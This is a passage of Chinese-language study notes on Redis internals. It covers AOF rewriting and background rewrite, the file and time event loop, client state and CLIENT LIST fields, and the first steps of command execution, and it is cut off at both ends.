               rewrite_string(key)            elif key.type == List:                rewrite_list(key)            elif key.type == Hash:                rewrite_hash(key)            elif key.type == Set:                rewrite_set(key)            elif key.type == SortedSet:                rewrite_sorted_set(key)            # 如果键带有过期时间，那么过期时间也要被重写            if key.have_expire_time():                rewrite_expire_time(key)    # 写入完毕，关闭文件    f.close()def rewrite_string(key):    # 使用GET命令获取字符串键的值    value = GET(key)    # 使用SET命令重写字符串键    f.write_command(SET, key, value)def rewrite_list(key):    # 使用LRANGE命令获取列表键包含的所有元素    item1, item2, ..., itemN = LRANGE(key, 0, -1)    # 使用RPUSH命令重写列表键    f.write_command(RPUSH, key, item1, item2, ..., itemN)def rewrite_hash(key):    # 使用HGETALL命令获取哈希键包含的所有键值对    field1, value1, field2, value2, ..., fieldN, valueN = HGETALL(key)    # 使用HMSET命令重写哈希键    f.write_command(HMSET, key, field1, value1, field2, value2, ..., fieldN, valueN)def rewrite_set(key);# 使用SMEMBERS命令获取集合键包含的所有元素elem1, elem2, ..., elemN = SMEMBERS(key)# 使用SADD命令重写集合键f.write_command(SADD, key, elem1, elem2, ..., elemN)def rewrite_sorted_set(key):    # 使用ZRANGE命令获取有序集合键包含的所有元素    member1, score1, member2, score2, ..., memberN, scoreN = ZRANGE(key, 0, -1, &quot;WITHSCORES&quot;)    # 使用ZADD命令重写有序集合键    f.write_command(ZADD, key, score1, member1, score2, member2, ..., scoreN, memberN)def rewrite_expire_time(key):    # 获取毫秒精度的键过期时间戳    timestamp = get_expire_time_in_unixstamp(key)    # 使用PEXPIREAT命令重写键的过期时间    f.write_command(PEXPIREAT, key, timestamp)\n\n因为aof_rewrite函数生成的新AOF文件只包含还原当前数据库状态所必须的命令，所以新AOF文件不会浪费任何硬盘空间。\n在实际中，为了避免在执行命令时造成客户端输入缓冲区溢出，重写程序在处理列表、哈希表、集合、有序集合这四种可能会带有多个元素的键时，会先检查键所包含的元素数量，如果元素的数量超过了redis.h&#x2F;REDIS_AOF_REWRITE_ITEMS_PER_CMD常量的值，那么重写程序将使用多条命令来记录键的值，而不单单使用一条命令。\nAOF后台重写上面介绍的AOF重写程序aof_rewrite函数可以很好地完成创建一个新AOF文件的任务，但是，因为这个函数会进行大量的写入操作，所以调用这个函数的线程将被长时间阻塞。因为Redis服务器使用单个线程来处理命令请求，所以如果由服务器直接调用aof_rewrite函数的话，那么在重写AOF文件期间，服务期将无法处理客户端发来的命令请求。\n很明显，作为一种辅佐性的维护手段，Redis不希望AOF重写造成服务器无法处理请求，所以Redis决定将AOF重写程序放到子进程里执行，这样做可以同时达到两个目的：\n\n子进程进行AOF重写期间，服务器进程（父进程）可以继续处理命令请求。\n子进程带有服务器进程的数据副本，使用子进程而不是线程，可以在避免使用锁的情况下，保证数据的安全性。\n\n不过，使用子进程也有一个问题需要解决，因为子进程在进行AOF重写期间，服务器进程还需要继续处理命令请求，而新的命令可能会对现有的数据库状态进行修改，从而使得服务器当前的数据库状态和重写后的AOF文件所保存的数据库状态不一致。为了解决这种数据不一致问题，Redis服务器设置了一个AOF重写缓冲区，这个缓冲区在服务器创建子进程之后开始使用，当Redis服务器执行完一个写命令之后，它会同时将这个写命令发送给AOF缓冲区和AOF重写缓冲区。\n这也就是说，在子进程执行AOF重写期间，服务器进程需要执行以下三个工作：\n\n执行客户端发来的命令。\n将执行后的写命令追加到AOF缓冲区。\n将执行后的写命令追加到AOF重写缓冲区。\n\n这样一来可以保证：\n\nAOF缓冲区的内容会定期被写入和同步到AOF文件，对现有AOF文件的处理工作会如常进行。\n从创建子进程开始，服务器执行的所有写命令都会被记录到AOF重写缓冲区里面。\n\n当子进程完成AOF重写工作之后，它会向父进程发送一个信号，父进程在接到该信号之后，会调用一个信号处理函数，并执行以下工作：\n\n将AOF重写缓冲区中的所有内容写入到新AOF文件中，这时新AOF文件所保存的数据库状态将和服务器当前的数据库状态一致。\n对新的AOF文件进行改名，原子地（atomic）覆盖现有的AOF文件，完成新旧两个AOF文件的替换。\n\n这个信号处理函数执行完毕之后，父进程就可以继续像往常一样接受命令请求了。在整个AOF后台重写过程中，只有信号处理函数执行时会对服务器进程（父进程）造成阻塞，在其他时候，AOF后台重写都不会阻塞父进程，这将AOF重写对服务器性能造成的影响降到了最低。\n第十二章 - 事件Redis服务器是一个事件驱动程序，服务器需要处理以下两类事件：\n\n文件事件（file event）：Redis服务器通过套接字与客户端（或者其他Redis服务器）进行连接，而文件事件就是服务器对套接字操作的抽象。服务器与客户端（或者其他服务器）的通信会产生相应的文件事件，而服务器则通过监听并处理这些事件来完成一系列网络通信操作。\n时间事件（time event）：Redis服务器中的一些操作（比如serverCron函数）需要在给定的时间点执行，而时间事件就是服务器对这类定时操作的抽象。\n\n文件事件Redis基于Reactor模式开发了自己的网络事件处理器：这个处理器被称为文件事件处理器（file event handler）：\n\n文件事件处理器使用I&#x2F;O多路复用（multiplexing）程序来同时监听多个套接字，并根据套接字目前执行的任务来为套接字关联不同的事件处理器。\n当被监听的套接字准备好执行连接应答（accept）、读取（read）、写入（write）、关闭（close）等操作时，与操作相对应的文件事件就会产生，这时文件事件处理器就会调用套接字之前关联好的事件处理器来处理这些事件。\n\n虽然文件事件处理器以单线程方式运行，但通过使用I&#x2F;O多路复用程序来监听多个套接字，文件事件处理器既实现了高性能的网络通信模型，又可以很好地与Redis服务器中其他同样以单线程方式运行的模块进行对接，这保持了Redis内部单线程设计的简单性。\n文件事件处理器的构成文件事件是对套接字操作的抽象，每当一个套接字准备好执行连接应答（accept）、写入、读取、关闭等操作时，就会产生一个文件事件。因为一个服务器通常会连接多个套接字，所以多个文件事件有可能会并发地出现。I&#x2F;O多路复用程序负责监听多个套接字，并向文件事件分派器传送那些产生了事件的套接字。尽管多个文件事件可能会并发地出现，但I&#x2F;O多路复用程序总是会将所有产生事件的套接字都放到一个队列里面，然后通过这个队列，以有序（sequentially）、同步（synchronously）、每次一个套接字的方式向文件事件分派器传送套接字。当上一个套接字产生的事件被处理完毕之后（该套接字为事件所关联的事件处理器执行完毕），I&#x2F;O多路复用程序才会继续向文件事件分派器传送下一个套接字。\n文件事件分派器接收I&#x2F;O多路复用程序传来的套接字，并根据套接字产生的事件的类型，调用相应的事件处理器。服务器会为执行不同任务的套接字关联不同的事件处理器，这些处理器是一个个函数，它们定义了某个事件发生时，服务器应该执行的动作。\nI&#x2F;O多路复用程序的实现Redis的I&#x2F;O多路复用程序的所有功能都是通过包装常见的select、epoll、evport和kqueue这些I&#x2F;O多路复用函数库来实现的。每个I&#x2F;O多路复用函数库在Redis源码中都对应一个单独的文件，比如ae_select.c、ae_epoll.c、ae_kqueue.c，诸如此类。\n因为Redis为每个I&#x2F;O多路复用函数库都实现了相同的API，所以I&#x2F;O多路复用程序的底层实现是可以互换的\nRedis在I&#x2F;O多路复用程序的实现源码中用#include宏定义了相应的规则，程序会在编译时自动选择系统中性能最高的I&#x2F;O多路复用函数库来作为Redis的I&#x2F;O多路复用程序的底层实现：\n/* Include the best multiplexing layer supported by this system.  * The following should be ordered by performances, descending. */# ifdef HAVE_EVPORT# include &quot;ae_evport.c&quot;# else    # ifdef HAVE_EPOLL    # include &quot;ae_epoll.c&quot;    # else        # ifdef HAVE_KQUEUE        # include &quot;ae_kqueue.c&quot;        # else        # include &quot;ae_select.c&quot;        # endif    # endif# endif\n\n事件的类型I&#x2F;O多路复用程序可以监听多个套接字的ae.h&#x2F;AE_READABLE事件和ae.h&#x2F;AE_WRITABLE事件，这两类事件和套接字操作之间的对应关系如下：\n\n当套接字变得可读时（客户端对套接字执行write操作，或者执行close操作），或者有新的可应答（acceptable）套接字出现时（客户端对服务器的监听套接字执行connect操作），套接字产生AE_READABLE事件。\n当套接字变得可写时（客户端对套接字执行read操作），套接字产生AE_WRITABLE事件。\n\nI&#x2F;O多路复用程序允许服务器同时监听套接字的AE_READABLE事件和AE_WRITABLE事件，如果一个套接字同时产生了这两种事件，那么文件事件分派器会优先处理AE_READABLE事件，等到AE_READABLE事件处理完之后，才处理AE_WRITABLE事件。这也就是说，如果一个套接字又可读又可写的话，那么服务器将先读套接字，后写套接字。\nAPIae.c&#x2F;aeCreateFileEvent函数接受一个套接字描述符、一个事件类型，以及一个事件处理器作为参数，将给定套接字的给定事件加入到I&#x2F;O多路复用程序的监听范围之内，并对事件和事件处理器进行关联。ae.c&#x2F;aeDeleteFileEvent函数接受一个套接字描述符和一个监听事件类型作为参数，让I&#x2F;O多路复用程序取消对给定套接字的给定事件的监听，并取消事件和事件处理器之间的关联。ae.c&#x2F;aeGetFileEvents函数接受一个套接字描述符，返回该套接字正在被监听的事件类型：\n\n如果套接字没有任何事件被监听，那么函数返回AE_NONE。\n如果套接字的读事件正在被监听，那么函数返回AE_READABLE。\n如果套接字的写事件正在被监听，那么函数返回AE_WRITABLE。\n如果套接字的读事件和写事件正在被监听，那么函数返回AE_READABLE|AE_WRITABLE。\n\nae.c&#x2F;aeWait函数接受一个套接字描述符、一个事件类型和一个毫秒数为参数，在给定的时间内阻塞并等待套接字的给定类型事件产生，当事件成功产生，或者等待超时之后，函数返回。ae.c&#x2F;aeApiPoll函数接受一个sys&#x2F;time.h&#x2F;struct timeval结构为参数，并在指定的时间內，阻塞并等待所有被aeCreateFileEvent函数设置为监听状态的套接字产生文件事件，当有至少一个事件产生，或者等待超时后，函数返回。ae.c&#x2F;aeProcessEvents函数是文件事件分派器，它先调用aeApiPoll函数来等待事件产生，然后遍历所有已产生的事件，并调用相应的事件处理器来处理这些事件。ae.c&#x2F;aeGetApiName函数返回I&#x2F;O多路复用程序底层所使用的I&#x2F;O多路复用函数库的名称：返回”epoll”表示底层为epoll函数库，返回”select”表示底层为select函数库，诸如此类。\n文件事件的处理器Redis为文件事件编写了多个处理器，这些事件处理器分别用于实现不同的网络通信需求，比如说：\n\n为了对连接服务器的各个客户端进行应答，服务器要为监听套接字关联连接应答处理器。\n为了接收客户端传来的命令请求，服务器要为客户端套接字关联命令请求处理器。\n为了向客户端返回命令的执行结果，服务器要为客户端套接字关联命令回复处理器。\n当主服务器和从服务器进行复制操作时，主从服务器都需要关联特别为复制功能编写的复制处理器。\n\n在这些事件处理器里面，服务器最常用的要数与客户端进行通信的连接应答处理器、命令请求处理器和命令回复处理器。\n连接应答处理器networking.c&#x2F;acceptTcpHandler函数是Redis的连接应答处理器，这个处理器用于对连接服务器监听套接字的客户端进行应答，具体实现为sys&#x2F;socket.h&#x2F;accept函数的包装。当Redis服务器进行初始化的时候，程序会将这个连接应答处理器和服务器监听套接字的AE_READABLE事件关联起来，当有客户端用sys&#x2F;socket.h&#x2F;connect函数连接服务器监听套接字的时候，套接字就会产生AE_READABLE事件，引发连接应答处理器执行，并执行相应的套接字应答操作。\n命令请求处理器networking.c&#x2F;readQueryFromClient函数是Redis的命令请求处理器，这个处理器负责从套接字中读入客户端发送的命令请求内容，具体实现为unistd.h&#x2F;read函数的包装。当一个客户端通过连接应答处理器成功连接到服务器之后，服务器会将客户端套接字的AE_READABLE事件和命令请求处理器关联起来，当客户端向服务器发送命令请求的时候，套接字就会产生AE_READABLE事件，引发命令请求处理器执行，并执行相应的套接字读入操作。\n命令回复处理器networking.c&#x2F;sendReplyToClient函数是Redis的命令回复处理器，这个处理器负责将服务器执行命令后得到的命令回复通过套接字返回给客户端，具体实现为unistd.h&#x2F;write函数的包装。当服务器有命令回复需要传送给客户端的时候，服务器会将客户端套接字的AE_WRITABLE事件和命令回复处理器关联起来，当客户端准备好接收服务器传回的命令回复时，就会产生AE_WRITABLE事件，引发命令回复处理器执行，并执行相应的套接字写入操作。\n\n时间事件Redis的时间事件分为以下两类：\n\n定时事件：让一段程序在指定的时间之后执行一次。比如说，让程序X在当前时间的30毫秒之后执行一次。\n周期性事件：让一段程序每隔指定时间就执行一次。比如说，让程序Y每隔30毫秒就执行一次。\n\n一个时间事件主要由以下三个属性组成：\n\nid：服务器为时间事件创建的全局唯一ID（标识号）。ID号按从小到大的顺序递增，新事件的ID号比旧事件的ID号要大。\nwhen：毫秒精度的UNIX时间戳，记录了时间事件的到达（arrive）时间。\ntimeProc：时间事件处理器，一个函数。当时间事件到达时，服务器就会调用相应的处理器来处理事件。\n\n一个时间事件是定时事件还是周期性事件取决于时间事件处理器的返回值：\n\n如果事件处理器返回ae.h&#x2F;AE_NOMORE，那么这个事件为定时事件：该事件在达到一次之后就会被删除，之后不再到达。\n如果事件处理器返回一个非AE_NOMORE的整数值，那么这个事件为周期性时间：当一个时间事件到达之后，服务器会根据事件处理器返回的值，对时间事件的when属性进行更新，让这个事件在一段时间之后再次到达，并以这种方式一直更新并运行下去。比如说，如果一个时间事件的处理器返回整数值30，那么服务器应该对这个时间事件进行更新，让这个事件在30毫秒之后再次到达。\n\n实现服务器将所有时间事件都放在一个无序链表中，每当时间事件执行器运行时，它就遍历整个链表，查找所有已到达的时间事件，并调用相应的事件处理器。\n\n这里说保存时间事件的链表为无序链表，指的不是链表不按ID排序，而是说，该链表不按when属性的大小排序。正因为链表没有按when属性进行排序，所以当时间事件执行器运行的时候，它必须遍历链表中的所有时间事件，这样才能确保服务器中所有已到达的时间事件都会被处理。无序链表并不影响时间事件处理器的性能\n\nAPIae.c&#x2F;aeCreateTimeEvent函数接受一个毫秒数milliseconds和一个时间事件处理器proc作为参数。将一个新的时间事件添加到服务器，这个新的时间事件将在当前时间的milliseconds毫秒之后到达，而事件的处理器为proc。\nae.c&#x2F;aeDeleteFileEvent函数接受一个时间事件ID作为参数，然后从服务器中删除该ID所对应的时间事件。\nae.c&#x2F;aeSearchNearestTimer函数返回到达时间距离当前时间最接近的那个时间事件。\nae.c&#x2F;processTimeEvents函数是时间事件的执行器，这个函数会遍历所有已到达的时间事件，并调用这些事件的处理器。已到达指的是，时间事件的when属性记录的UNIX时间戳等于或小于当前时间的UNIX时间戳。\n时间事件应用实例：serverCron函数持续运行的Redis服务器需要定期对自身的资源和状态进行检查和调整，从而确保服务器可以长期、稳定地运行，这些定期操作由redis.c&#x2F;serverCron函数负责执行，它的主要工作包括：\n\n更新服务器的各类统计信息，比如时间、内存占用、数据库占用情况等。\n清理数据库中的过期键值对。\n关闭和清理连接失效的客户端。\n尝试进行AOF或RDB持久化操作。\n如果服务器是主服务器，那么对从服务器进行定期同步。\n如果处于集群模式，对集群进行定期同步和连接测试。\n\nRedis服务器以周期性事件的方式来运行serverCron函数，在服务器运行期间，每隔一段时间，serverCron就会执行一次，直到服务器关闭为止。\n在Redis2.6版本，服务器默认规定serverCron每秒运行10次，平均每间隔100毫秒运行一次。从Redis2.8开始，用户可以通过修改hz选项来调整serverCron的每秒执行次数，具体信息请参考示例配置文件redis.conf关于hz选项的说明。\n事件的调度与执行因为服务器中同时存在文件事件和时间事件两种事件类型，所以服务器必须对这两种事件进行调度，决定何时应该处理文件事件，何时又应该处理时间事件，以及花多少时间来处理它们等等。\n事件的调度和执行由ae.c&#x2F;aeProcessEvents函数负责，以下是该函数的伪代码表示：\ndef aeProcessEvents():    # 获取到达时间离当前时间最接近的时间事件    time_event = aeSearchNearestTimer()    # 计算最接近的时间事件距离到达还有多少毫秒    remaind_ms = time_event.when - unix_ts_now()    # 如果事件已到达，那么remaind_ms的值可能为负数，将它设定为0    if remaind_ms &lt; 0:        remaind_ms = 0    # 根据remaind_ms的值，创建timeval结构    timeval = create_timeval_with_ms(remaind_ms)    # 阻塞并等待文件事件产生，最大阻塞时间由传入的timeval结构决定    # 如果remaind_ms的值为0，那么aeApiPoll调用之后马上返回，不阻塞    aeApiPoll(timeval)    # 处理所有已产生的文件事件    processFileEvents()    # 处理所有已到达的时间事件    processTimeEvents()\n\n前面在介绍文件事件API的时候，并没有讲到processFileEvents这个函数，因为它并不存在，在实际中，处理已产生文件事件的代码是直接写在aeProcessEvents函数里面的，这里为了方便讲述，才虚构了processFileEvents函数。\n将aeProcessEvents函数置于一个循环里面，加上初始化和清理函数，这就构成了Redis服务器的主函数：\ndef main():    # 初始化服务器    init_server()    # 一直处理事件，直到服务器关闭为止    while server_is_not_shutdown():        aeProcessEvents()    # 服务器关闭，执行清理操作    clean_server()\n\n以下是事件的调度和执行规则：\n\naeApiPoll函数的最大阻塞时间由到达时间最接近当前时间的时间事件决定，这个方法既可以避免服务器对时间事件进行频繁的轮询（忙等待），也可以确保aeApiPoll函数不会阻塞过长时间。\n因为文件事件是随机出现的，如果等待并处理完一次文件事件之后，仍未有任何时间事件到达，那么服务器将再次等待并处理文件事件。随着文件事件的不断执行，时间会逐渐向时间事件所设置的到达时间逼近，并最终来到到达时间，这时服务器就可以开始处理到达的时间事件了。\n对文件事件和时间事件的处理都是同步、有序、原子地执行的，服务器不会中途中断事件处理，也不会对事件进行抢占，因此，不管是文件事件的处理器，还是时间事件的处理器，它们都会尽可地减少程序的阻塞时间，并在有需要时主动让出执行权，从而降低造成事件饥饿的可能性。比如说，在命令回复处理器将一个命令回复写入到客户端套接字时，如果写入字节数超过了一个预设常量的话，命令回复处理器就会主动用break跳出写入循环，将余下的数据留到下次再写；另外，时间事件也会将非常耗时的持久化操作放到子线程或者子进程执行。\n因为时间事件在文件事件之后执行，并且事件之间不会出现抢占，所以时间事件的实际处理时间，通常会比时间事件设定的到达时间稍晚一些。\n\n第十三章 - 客户端Redis服务器是典型的一对多服务器程序：一个服务器可以与多个客户端建立网络连接，每个客户端可以向服务器发送命令请求，而服务器则接收并处理客户端发送的命令请求，并向客户端返回命令回复。通过使用由I&#x2F;O多路复用技术实现的文件事件处理器，Redis服务器使用单线程单进程的方式来处理命令请求，并与多个客户端进行网络通信。\n对于每个与服务器进行连接的客户端，服务器都为这些客户端建立了相应的redis.h&#x2F;redisClient结构（客户端状态），这个结构保存了客户端当前的状态信息，以及执行相关功能时需要用到的数据结构，其中包括：\n\n客户端的套接字描述符。\n客户端的名字。\n客户端的标志值（flag）。\n指向客户端正在使用的数据库的指针，以及该数据库的号码。\n客户端当前要执行的命令、命令的参数、命令参数的个数，以及指向命令实现函数的指针。\n客户端的输入缓冲区和输出缓冲区。\n客户端的复制状态信息，以及进行复制所需的数据结构。\n客户端执行BRPOP、BLPOP等列表阻塞命令时使用的数据结构。\n客户端的事务状态，以及执行WATCH命令时用到的数据结构。\n客户端执行发布与订阅功能时用到的数据结构。\n客户端的身份验证标志。\n客户端的创建时间，客户端和服务器最后一次通信的时间，以及客户端的输出缓冲区大小超出软性限制（soft limit）的时间。\n\nRedis服务器状态结构的clients属性是一个链表，这个链表保存了所有与服务器连接的客户端的状态结构，对客户端执行批量操作，或者查找某个指定的客户端，都可以通过遍历clients链表来完成：\nstruct redisServer &#123;    // ...    // 一个链表，保存了所有客户端状态    list *clients;    // ...&#125;;\n\n客户端属性客户端状态包含的属性可以分为两类：\n\n一类是比较通用的属性，这些属性很少与特定功能相关，无论客户端执行的是什么工作，它们都要用到这些属性。\n另外一类是和特定功能相关的属性，比如操作数据库时需要用到的db属性和dictid属性，执行事务时需要用到的mstate属性，以及执行WATCH命令时需要用到的watched_keys属性等等。\n\n执行CLIENT list命令可以列出目前所有连接到服务器的普通客户端：\nredis&gt; CLIENT listid=3 addr=172.17.0.1:47759 laddr=172.17.0.2:6379 fd=11 name= age=0 idle=0 flags=N db=0 sub=0 psub=0 ssub=0 multi=-1 watch=0 qbuf=26 qbuf-free=20448 argv-mem=10 multi-mem=0 rbs=1024 rbp=673 obl=0 oll=0 omem=0 tot-mem=22426 events=r cmd=client|list user=default redir=-1 resp=2 lib-name=jedis lib-ver=4.4.3\n\n\nid: 客户端的唯一标识符。\naddr: 客户端的 IP 地址和端口号。\nladdr: Redis 服务器本地的 IP 地址和端口号，用于此连接。\nfd: 客户端连接的文件描述符。\nname: 客户端名称，默认空白，可通过 CLIENT SETNAME 设置。\nage: 该连接的持续时间（以秒为单位）。\nidle: 客户端自上次发出命令后空闲的时间（以秒为单位）。\nflags: 客户端的标志位。这里的 N 表示普通客户端，未设置特殊标志。\ndb: 客户端正在使用的数据库编号。\nsub: 该客户端的频道订阅数量。\npsub: 该客户端的模式订阅数量（订阅模式匹配的通配符频道）。\nssub: 共享订阅数量，用于集群环境下的连接共享。\nmulti: 当前事务队列中的命令数量。如果客户端未使用事务，则显示为 -1。\nwatch: 客户端监视的键的数量（事务监视机制）。\nqbuf: 查询缓冲区的当前长度（字节数）。\nqbuf-free: 查询缓冲区的空闲空间（字节数）。\nargv-mem: 命令参数占用的内存量（字节数）。\nmulti-mem: 事务命令队列所占用的内存量（字节数）。\nrbs: 该客户端的复制缓冲区大小。\nrbp: 复制缓冲区中的偏移量。\nobl: 输出缓冲区的长度。\noll: 输出缓冲区的链表长度。\nomem: 输出缓冲区占用的内存量。\ntot-mem: 客户端连接总占用的内存量。\nevents: 事件标志，r 表示客户端可读。\ncmd: 客户端最后执行的命令。\nuser: 客户端认证的用户名（这里为 default）。\nredir: 当前客户端重定向的目标（-1 表示未重定向）。\nresp: 客户端使用的 RESP 协议版本。\nlib-name: 客户端连接库的名称（例如 jedis）。\nlib-ver: 客户端库的版本（例如 4.4.3）。\n\n下面就不放书中所列举的各属性的含义了，只取部分解释，因为书中使用的Redis版本较老，部分已经更改或弃用了。需要最新的还是得看官方文档（很全）。\n其中，客户端标识 flags 可以是以下组合：\nA: connection to be closed ASAPb: the client is waiting in a blocking operationc: connection to be closed after writing entire replyd: a watched keys has been modified - EXEC will faile: the client is excluded from the client eviction mechanismi: the client is waiting for a VM I/O (deprecated)M: the client is a masterN: no specific flag setO: the client is a client in MONITOR modeP: the client is a Pub/Sub subscriberr: the client is in readonly mode against a cluster nodeS: the client is a replica node connection to this instanceu: the client is unblockedU: the client is connected via a Unix domain socketx: the client is in a MULTI/EXEC contextt: the client enabled keys tracking in order to perform client side cachingT: the client will not touch the LRU/LFU of the keys it accessesR: the client tracking target client is invalidB: the client enabled broadcast tracking mode \n\nPUBSUB命令和SCRIPT LOAD命令的特殊性通常情况下，Redis只会将那些对数据库进行了修改的命令写入到AOF文件，并复制到各个从服务器。如果一个命令没有对数据库进行任何修改，那么它就会被认为是只读命令，这个命令不会被写入到AOF文件，也不会被复制到从服务器。\n以上规则适用于绝大部分Redis命令，但PUBSUB命令和SCRIPT LOAD命令是其中的例外。PUBSUB命令虽然没有修改数据库，但PUBSUB命令向频道的所有订阅者发送消息这一行为带有副作用，接收到消息的所有客户端的状态都会因为这个命令而改变。因此，在早期版本服务器需要使用REDIS_FORCE_AOF标志，强制将这个命令写入AOF文件，这样在将来载入AOF文件时，服务器就可以再次执行相同的PUBSUB命令，并产生相同的副作用。SCRIPT LOAD命令的情况与PUBSUB命令类似：虽然SCRIPT LOAD命令没有修改数据库，但它修改了服务器状态，所以它是一个带有副作用的命令，服务器需要使用REDIS_FORCE_AOF标志，强制将这个命令写入AOF文件，使得将来在载入AOF文件时，服务器可以产生相同的副作用。另外，为了让主服务器和从服务器都可以正确地载入SCRIPT LOAD命令指定的脚本，服务器需要使用REDIS_FORCE_REPL标志，强制将SCRIPT LOAD命令复制给所有从服务器。\n关于Redis主从复制可以参考这几篇文章：Redis replicationRedis主从同步原理、及SYNC和PSYNC同步区别Redis:发布订阅(pub&#x2F;sub)的实现原理及避坑场景\n客户端的创建与关闭服务器使用不同的方式来创建和关闭不同类型的客户端。\n创建普通客户端如果客户端是通过网络连接与服务器进行连接的普通客户端，那么在客户端使用connect函数连接到服务器时，服务器就会调用连接事件处理器，为客户端创建相应的客户端状态，并将这个新的客户端状态添加到服务器状态结构clients链表的末尾。\n关闭普通客户端一个普通客户端可以因为多种原因而被关闭：\n\n如果客户端进程退出或者被杀死，那么客户端与服务器之间的网络连接将被关闭，从而造成客户端被关闭。\n如果客户端向服务器发送了带有不符合协议格式的命令请求，那么这个客户端也会被服务器关闭。\n如果客户端成为了CLIENT KILL命令的目标，那么它也会被关闭。\n如果用户为服务器设置了timeout配置选项，那么当客户端的空转时间超过timeout选项设置的值时，客户端将被关闭。不过timeout选项有一些例外情况：如果客户端是主服务器（打开了REDIS_MASTER标志），从服务器（打开了REDIS_SLAVE标志），正在被BLPOP等命令阻塞（打开了REDIS_BLOCKED标志），或者正在执行SUBSCRIBE、PSUBSCRIBE等订阅命令，那么即使客户端的空转时间超过了timeout选项的值，客户端也不会被服务器关闭。\n如果客户端发送的命令请求的大小超过了输入缓冲区的限制大小（默认为1 GB），那么这个客户端会被服务器关闭。\n如果要发送给客户端的命令回复的大小超过了输出缓冲区的限制大小，那么这个客户端会被服务器关闭。\n\n前面介绍输出缓冲区的时候提到过，可变大小缓冲区由一个链表和任意多个字符串对象组成，理论上来说，这个缓冲区可以保存任意长的命令回复。但是，为了避免客户端的回复过大，占用过多的服务器资源，服务器会时刻检查客户端的输出缓冲区的大小，并在缓冲区的大小超出范围时，执行相应的限制操作。\n服务器使用两种模式来限制客户端输出缓冲区的大小：\n\n硬性限制（hard limit）：如果输出缓冲区的大小超过了硬性限制所设置的大小，那么服务器立即关闭客户端。\n软性限制（soft limit）：如果输出缓冲区的大小超过了软性限制所设置的大小，但还没超过硬性限制，那么服务器将使用客户端状态结构的obuf_soft_limit_reached_time属性记录下客户端到达软性限制的起始时间；之后服务器会继续监视客户端，如果输出缓冲区的大小一直超出软性限制，并且持续时间超过服务器设定的时长，那么服务器将关闭客户端；相反地，如果输出缓冲区的大小在指定时间之内，不再超出软性限制，那么客户端就不会被关闭，并且obuf_soft_limit_reached_time属性的值也会被清零。\n\n使用client-output-buffer-limit选项可以为普通客户端、从服务器客户端、执行发布与订阅功能的客户端分别设置不同的软性限制和硬性限制。client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt;\nLua脚本的伪客户端服务器会在初始化时创建负责执行Lua脚本中包含的Redis命令的伪客户端，并将这个伪客户端关联在服务器状态结构的lua_client属性中：\nstruct redisServer &#123;    // ...    redisClient *lua_client;    // ...&#125;;\n\nlua_client伪客户端在服务器运行的整个生命期中会一直存在，只有服务器被关闭时，这个客户端才会被关闭。\nAOF文件的伪客户端服务器在载入AOF文件时，会创建用于执行AOF文件包含的Redis命令的伪客户端，并在载入完成之后，关闭这个伪客户端。\n第十四章 - 服务器Redis服务器负责与多个客户端建立网络连接，处理客户端发送的命令请求，在数据库中保存客户端执行命令所产生的数据，并通过资源管理来维持服务器自身的运转。\n命令请求的执行过程从客户端发送SET KEY VALUE命令到获得回复OK期间，客户端和服务器共需要执行以下操作：\n\n客户端向服务器发送命令请求SET KEY VALUE。Redis服务器的命令请求来自Redis客户端，当用户在客户端中键入一个命令请求时，客户端会将这个命令请求转换成协议格式，然后通过连接到服务器的套接字，将协议格式的命令请求发送给服务器。\n服务器接收并处理客户端发来的命令请求SET KEY VALUE，在数据库中进行设置操作，并产生命令回复OK。当客户端与服务器之间的连接套接字因为客户端的写入而变得可读时，服务器将调用命令请求处理器来执行以下操作：\n读取套接字中协议格式的命令请求，并将其保存到客户端状态的输入缓冲区里面。\n对输入缓冲区中的命令请求进行分析，提取出命令请求中包含的命令参数，以及命令参数的个数，然后分别将参数和参数个数保存到客户端状态的argv属性和argc属性里面。\n调用命令执行器，执行客户端指定的命令。\n命令执行器（1）：查找命令实现命令执行器要做的第一件事就是根据客户端状态的argv[0]参数，在命令表（command table）中查找参数所指定的命令，并将找到的命令保存到客户端状态的cmd属性里面。命令表是一个字典，字典的键是一个个命令名字，比如”set”、”get”、”del”等等；而字典的值则是一个个redisCommand结构，每个redisCommand结构记录了一个Redis命令的实现信息。\n命令执行器（2）：执行预备操作到目前为止，服务器已经将执行命令所需的命令实现函数（保存在客户端状态的cmd属性）、参数（保存在客户端状态的argv属性）、参数个数（保存在客户端状态的argc属性）都收集齐了，但是在真正执行命令之前，程序还需要进行一些预备操作，从而确保命令可以正确、顺利地被执行，这些操作包括：\n检查客户端状态的cmd指针是否指向NULL，如果是的话，那么说明用户输入的命令名字找不到相应的命令实现，服务器不再执行后续步骤，并向客户端返回一个错误。\n根据客户端cmd属性指向的redisCommand结构的arity属性，检查命令请求所给定的参数个数是否正确，当参数个数不正确时，不再执行后续步骤，直接向客户端返回一个错误。比如说，如果redisCommand结构的arity属性的值为-3，那么用户输入的命令参数个数必须大于等于3个才行。\n检查客户端是否已经通过了身份验证，未通过身份验证的客户端只能执行AUTH命令，如果未通过身份验证的客户端试图执行除AUTH命令之外的其他命令，那么服务器将向客户端返回一个错误。\n如果服务器打开了maxmemory功能，那么在执行命令之前，先检查服务器的内存占用情况，并在有需要时进行内存回收，从而使得接下来的命令可以顺利执行。如果内存回收失败，那么不再执行后续步骤，向客户端返回一个错误。\n如果服务器上一次执行BGSAVE命令时出错，并且服务器打开了stop-writes-on-bgsave-error功能，而且服务器即将要执行的命令是一个写命令，那么服务器将拒绝执行这个命令，并向客户端返回一个错误。\n如果客户端当前正在用SUBSCRIBE命令订阅频道，或者正在用PSUBSCRIBE命令订阅模式，那么服务器只会执行客户端发来的SUBSCRIBE、PSUBSCRIBE、UNSUBSCRIBE、PUNSUBSCRIBE四个命令，其他命令都会被服务器拒绝。\n如果服务器正在进行数据载入，那么客户端发送的命令必须带有l标识（比如INFO、SHUTDOWN、PUBLISH等等）才会被服务器执行，其他命令都会被服务器拒绝。\n如果服务器因为执行Lua脚本而超时并进入阻塞状态，那么服务器只会执行客户端发来的SHUTDOWN nosave命令和SCRIPT 